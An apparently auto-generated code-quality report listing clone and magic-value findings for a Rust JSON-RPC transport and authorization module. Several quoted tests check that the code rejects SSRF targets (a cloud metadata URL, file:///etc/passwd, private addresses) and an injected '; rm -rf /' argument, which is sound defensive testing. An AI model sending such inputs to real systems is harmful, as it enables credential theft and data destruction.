---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1603

**Code:**
```
    fn test_truncate_error_body_long() {
        let long = "x".repeat(MAX_ERROR_BODY_LEN + 100);
        let truncated = truncate_error_body(&long);
        assert!(truncated.ends_with("... (truncated)"));
        assert!(truncated.len() < long.len());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1278

**Code:**
```
    fn test_ssrf_blocks_invalid_schemes() {
        // file:// scheme
        let result = HttpTransport::new("file:///etc/passwd".to_string());
        assert!(result.is_err());

        // ftp:// scheme
        let result = HttpTransport::new("ftp://example.com/file".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1621

**Code:**
```
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 110

**Code:**
```
fn is_private_ipv6(ip: &Ipv6Addr) -> bool {
    // Loopback (::1)
    ip.is_loopback()
        // Unspecified (::)
        || ip.is_unspecified()
        // IPv4-mapped addresses - check the embedded IPv4
        || ip.to_ipv4_mapped().map(|v4| is_private_ipv4(&v4)).unwrap_or(false)
        // Unique local addresses (fc00::/7)
        || (ip.segments()[0] & 0xfe00) == 0xfc00
        // Link-local (fe80::/10)
        || (ip.segments()[0] & 0xffc0) == 0xfe80
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1603

**Code:**
```
    fn test_truncate_error_body_long() {
        let long = "x".repeat(MAX_ERROR_BODY_LEN + 100);
        let truncated = truncate_error_body(&long);
        assert!(truncated.ends_with("... (truncated)"));
        assert!(truncated.len() < long.len());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1052

**Code:**
```
    fn test_message_request_with_params() {
        let params = serde_json::json!({"name": "get_weather"});
        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
        assert_eq!(msg.params, Some(params));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1052

**Code:**
```
    fn test_message_request_with_params() {
        let params = serde_json::json!({"name": "get_weather"});
        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
        assert_eq!(msg.params, Some(params));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1041

**Code:**
```
    fn test_message_request_construction() {
        let msg = Message::request(1, "tools/list", None);
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert_eq!(msg.method, Some("tools/list".to_string()));
        assert!(msg.params.is_none());
        assert!(msg.result.is_none());
        assert!(msg.error.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1603

**Code:**
```
    fn test_truncate_error_body_long() {
        let long = "x".repeat(MAX_ERROR_BODY_LEN + 100);
        let truncated = truncate_error_body(&long);
        assert!(truncated.ends_with("... (truncated)"));
        assert!(truncated.len() < long.len());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1112

**Code:**
```
    fn test_message_serialization_roundtrip() {
        let msg = Message::request(42, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, msg.id);
        assert_eq!(parsed.method, msg.method);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.1% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.1% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1688

**Code:**
```
    fn test_message_error_response_format() {
        let error_response = Message::error_response(
            Some(serde_json::json!(1)),
            -32600,
            "Invalid Request"
        );

        assert!(error_response.is_response());
        assert!(error_response.error.is_some());
        assert!(!error_response.is_request());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1104

**Code:**
```
    fn test_message_is_response() {
        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
        assert!(response.is_response());
        assert!(!response.is_request());
        assert!(!response.is_notification());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1278

**Code:**
```
    fn test_ssrf_blocks_invalid_schemes() {
        // file:// scheme
        let result = HttpTransport::new("file:///etc/passwd".to_string());
        assert!(result.is_err());

        // ftp:// scheme
        let result = HttpTransport::new("ftp://example.com/file".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1052

**Code:**
```
    fn test_message_request_with_params() {
        let params = serde_json::json!({"name": "get_weather"});
        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
        assert_eq!(msg.params, Some(params));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.8% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1278

**Code:**
```
    fn test_ssrf_blocks_invalid_schemes() {
        // file:// scheme
        let result = HttpTransport::new("file:///etc/passwd".to_string());
        assert!(result.is_err());

        // ftp:// scheme
        let result = HttpTransport::new("ftp://example.com/file".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.8% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1112

**Code:**
```
    fn test_message_serialization_roundtrip() {
        let msg = Message::request(42, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, msg.id);
        assert_eq!(parsed.method, msg.method);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1506

**Code:**
```
    fn test_transport_error_display() {
        let err = TransportError::Timeout;
        assert_eq!(format!("{}", err), "Timeout");

        let err = TransportError::ConnectionClosed;
        assert_eq!(format!("{}", err), "Connection closed");

        let err = TransportError::Http("404 Not Found".to_string());
        assert!(format!("{}", err).contains("404 Not Found"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1621

**Code:**
```
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1071

**Code:**
```
    fn test_message_error_response() {
        let msg = Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.result.is_none());
        let error = msg.error.unwrap();
        assert_eq!(error["code"], -32600);
        assert_eq!(error["message"], "Invalid Request");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1400

**Code:**
```
    fn test_args_injection_allows_safe_args() {
        // Normal arguments should be allowed
        let safe_args = vec![
            "--port".to_string(),
            "8080".to_string(),
            "--config".to_string(),
            "/path/to/config.json".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());

        // Arguments with spaces should be fine (shell won't split them)
        let safe_args = vec![
            "path with spaces/server.js".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1576

**Code:**
```
    fn test_message_format() {
        let msg = Message::request(1, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        
        assert!(parsed.is_request());
        assert_eq!(parsed.method, Some("tools/list".to_string()));
        assert_eq!(parsed.id, Some(serde_json::json!(1)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1104

**Code:**
```
    fn test_message_is_response() {
        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
        assert!(response.is_response());
        assert!(!response.is_request());
        assert!(!response.is_notification());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1071

**Code:**
```
    fn test_message_error_response() {
        let msg = Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.result.is_none());
        let error = msg.error.unwrap();
        assert_eq!(error["code"], -32600);
        assert_eq!(error["message"], "Invalid Request");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1252

**Code:**
```
    fn test_ssrf_blocks_private_ipv4() {
        // RFC 1918 private ranges
        assert!(HttpTransport::new("http://10.0.0.1/api".to_string()).is_err());
        assert!(HttpTransport::new("http://172.16.0.1/api".to_string()).is_err());
        assert!(HttpTransport::new("http://192.168.1.1/api".to_string()).is_err());

        // Loopback
        assert!(HttpTransport::new("http://127.0.0.1/api".to_string()).is_err());
        assert!(HttpTransport::new("http://127.0.0.53/api".to_string()).is_err());

        // Link-local (cloud metadata)
        assert!(HttpTransport::new("http://169.254.169.254/api".to_string()).is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1060

**Code:**
```
    fn test_message_response_construction() {
        let result = serde_json::json!({"tools": []});
        let msg = Message::response(serde_json::json!(1), result.clone());
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.method.is_none());
        assert_eq!(msg.result, Some(result));
        assert!(msg.error.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1252

**Code:**
```
    fn test_ssrf_blocks_private_ipv4() {
        // RFC 1918 private ranges
        assert!(HttpTransport::new("http://10.0.0.1/api".to_string()).is_err());
        assert!(HttpTransport::new("http://172.16.0.1/api".to_string()).is_err());
        assert!(HttpTransport::new("http://192.168.1.1/api".to_string()).is_err());

        // Loopback
        assert!(HttpTransport::new("http://127.0.0.1/api".to_string()).is_err());
        assert!(HttpTransport::new("http://127.0.0.53/api".to_string()).is_err());

        // Link-local (cloud metadata)
        assert!(HttpTransport::new("http://169.254.169.254/api".to_string()).is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1089

**Code:**
```
    fn test_message_is_notification() {
        let notification = Message {
            jsonrpc: "2.0".to_string(),
            id: None,
            method: Some("cancelled".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(notification.is_notification());
        assert!(!notification.is_request());
        assert!(!notification.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1052

**Code:**
```
    fn test_message_request_with_params() {
        let params = serde_json::json!({"name": "get_weather"});
        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
        assert_eq!(msg.params, Some(params));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1631

**Code:**
```
    fn test_is_private_ipv6_link_local() {
        // fe80::/10 link-local
        let link_local: Ipv6Addr = "fe80::1".parse().unwrap();
        assert!(is_private_ipv6(&link_local));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 110

**Code:**
```
fn is_private_ipv6(ip: &Ipv6Addr) -> bool {
    // Loopback (::1)
    ip.is_loopback()
        // Unspecified (::)
        || ip.is_unspecified()
        // IPv4-mapped addresses - check the embedded IPv4
        || ip.to_ipv4_mapped().map(|v4| is_private_ipv4(&v4)).unwrap_or(false)
        // Unique local addresses (fc00::/7)
        || (ip.segments()[0] & 0xfe00) == 0xfc00
        // Link-local (fe80::/10)
        || (ip.segments()[0] & 0xffc0) == 0xfe80
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.1% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1112

**Code:**
```
    fn test_message_serialization_roundtrip() {
        let msg = Message::request(42, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, msg.id);
        assert_eq!(parsed.method, msg.method);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.1% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1104

**Code:**
```
    fn test_message_is_response() {
        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
        assert!(response.is_response());
        assert!(!response.is_request());
        assert!(!response.is_notification());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1041

**Code:**
```
    fn test_message_request_construction() {
        let msg = Message::request(1, "tools/list", None);
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert_eq!(msg.method, Some("tools/list".to_string()));
        assert!(msg.params.is_none());
        assert!(msg.result.is_none());
        assert!(msg.error.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1104

**Code:**
```
    fn test_message_is_response() {
        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
        assert!(response.is_response());
        assert!(!response.is_request());
        assert!(!response.is_notification());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1052

**Code:**
```
    fn test_message_request_with_params() {
        let params = serde_json::json!({"name": "get_weather"});
        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
        assert_eq!(msg.params, Some(params));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1603

**Code:**
```
    fn test_truncate_error_body_long() {
        let long = "x".repeat(MAX_ERROR_BODY_LEN + 100);
        let truncated = truncate_error_body(&long);
        assert!(truncated.ends_with("... (truncated)"));
        assert!(truncated.len() < long.len());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.8% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1645

**Code:**
```
    fn test_is_private_ipv4_shared_address_space() {
        // 100.64.0.0/10 (RFC 6598 shared address space)
        let shared: Ipv4Addr = "100.64.0.1".parse().unwrap();
        assert!(is_private_ipv4(&shared));

        let shared_2: Ipv4Addr = "100.127.255.255".parse().unwrap();
        assert!(is_private_ipv4(&shared_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1638

**Code:**
```
    fn test_is_private_ipv6_public() {
        // Public IPv6 addresses should not be private
        let public: Ipv6Addr = "2001:db8::1".parse().unwrap();
        assert!(!is_private_ipv6(&public));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.7% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1104

**Code:**
```
    fn test_message_is_response() {
        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
        assert!(response.is_response());
        assert!(!response.is_request());
        assert!(!response.is_notification());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.6% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1089

**Code:**
```
    fn test_message_is_notification() {
        let notification = Message {
            jsonrpc: "2.0".to_string(),
            id: None,
            method: Some("cancelled".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(notification.is_notification());
        assert!(!notification.is_request());
        assert!(!notification.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1603

**Code:**
```
    fn test_truncate_error_body_long() {
        let long = "x".repeat(MAX_ERROR_BODY_LEN + 100);
        let truncated = truncate_error_body(&long);
        assert!(truncated.ends_with("... (truncated)"));
        assert!(truncated.len() < long.len());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1060

**Code:**
```
    fn test_message_response_construction() {
        let result = serde_json::json!({"tools": []});
        let msg = Message::response(serde_json::json!(1), result.clone());
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.method.is_none());
        assert_eq!(msg.result, Some(result));
        assert!(msg.error.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1278

**Code:**
```
    fn test_ssrf_blocks_invalid_schemes() {
        // file:// scheme
        let result = HttpTransport::new("file:///etc/passwd".to_string());
        assert!(result.is_err());

        // ftp:// scheme
        let result = HttpTransport::new("ftp://example.com/file".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1112

**Code:**
```
    fn test_message_serialization_roundtrip() {
        let msg = Message::request(42, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, msg.id);
        assert_eq!(parsed.method, msg.method);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1071

**Code:**
```
    fn test_message_error_response() {
        let msg = Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.result.is_none());
        let error = msg.error.unwrap();
        assert_eq!(error["code"], -32600);
        assert_eq!(error["message"], "Invalid Request");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1400

**Code:**
```
    fn test_args_injection_allows_safe_args() {
        // Normal arguments should be allowed
        let safe_args = vec![
            "--port".to_string(),
            "8080".to_string(),
            "--config".to_string(),
            "/path/to/config.json".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());

        // Arguments with spaces should be fine (shell won't split them)
        let safe_args = vec![
            "path with spaces/server.js".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1566

**Code:**
```
    fn test_validate_args_injection() {
        let args = vec!["-la".to_string(), "/tmp".to_string()];
        assert!(validate_args_for_injection(&args).is_ok());
        
        let bad_args = vec!["-la".to_string(), "; rm -rf /".to_string()];
        assert!(validate_args_for_injection(&bad_args).is_err());
    }
```

---

#### Magic value '"https"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 200

---

#### Magic value '80' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 201

---

#### Magic value '"code"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 398

---

#### Magic value '"message"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 399

---

#### Magic value 'b"\n"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 523

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 751

---

#### Magic value '30' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 856

---

#### Magic value '30' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 865

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 908

---

#### Magic value '"Accept"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 909

---

#### Magic value '"text/event-stream"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 946

---

#### Magic value '"data:"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 970

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1042

---

#### Magic value '"tools/call"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1054

---

#### Magic value '32600' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1072

---

#### Magic value '42' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1113

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1113

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1153

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1161

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1177

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1184

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1197

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1204

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1220

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1227

---

#### Magic value '"bash"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1420

---

#### Magic value '60' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1448

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1466

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1471

---

#### Magic value '"test/method"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1477

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1577

---

#### Magic value '"progress"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1677

---

#### Magic value '32600' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1691

---

#### Magic value '60' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1708

---

#### Magic value '30' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1718

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
